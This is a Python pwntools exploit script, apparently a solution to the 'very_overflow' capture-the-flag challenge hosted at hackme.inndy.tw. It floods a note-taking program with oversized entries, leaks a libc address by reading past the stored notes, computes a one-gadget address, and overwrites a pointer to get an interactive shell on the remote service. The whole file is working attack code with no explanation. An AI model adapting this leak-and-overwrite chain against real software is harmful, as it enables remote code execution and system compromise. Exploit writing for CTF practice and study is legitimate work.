#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import time
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

localMAGIC = 0x0003AC69      #locallibc
remoteMAGIC = 0x0003AC49      #remotelibc

def debug(addr = '0x0804895D'):
    raw_input('debug:')
    gdb.attach(io, "directory /home/h11p/hackme/\nb *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

elf = ELF('/home/h11p/hackme/very_overflow')

#io = process('/home/h11p/hackme/very_overflow')

io = remote('hackme.inndy.tw', 7705)



#debug()
for i in xrange(0,133):
    #time.sleep(2)
    io.recvuntil('Your action:')
    io.sendline("1")
    io.recvuntil("Input your note:")
    io.sendline('A' * 0x79)
io.recvuntil('Your action:')
io.sendline("1")
io.recvuntil("Input your note:")
io.sendline('c' * 0x2f)
io.recvuntil('Your action:')
io.sendline("3")
io.recvuntil('Which note to show:')
io.sendline('134')
io.recv()
io.sendline("2")
libc_start_main = io.recv().splitlines()[1]
libc_module=base_addr(libc_start_main[11:],0x18637)
#MAGIC_addr=libc_module+localMAGIC
MAGIC_addr=libc_module+remoteMAGIC
print hex(MAGIC_addr)
io.sendline('133')
io.recvuntil('Your new data:')
payload = 'a'*10+'b'*7+p32(MAGIC_addr)+'c'*9+'d'*10+'e'*7
io.sendline(payload)
io.recvuntil('Your action:')
io.sendline("5")
io.interactive()
io.close()

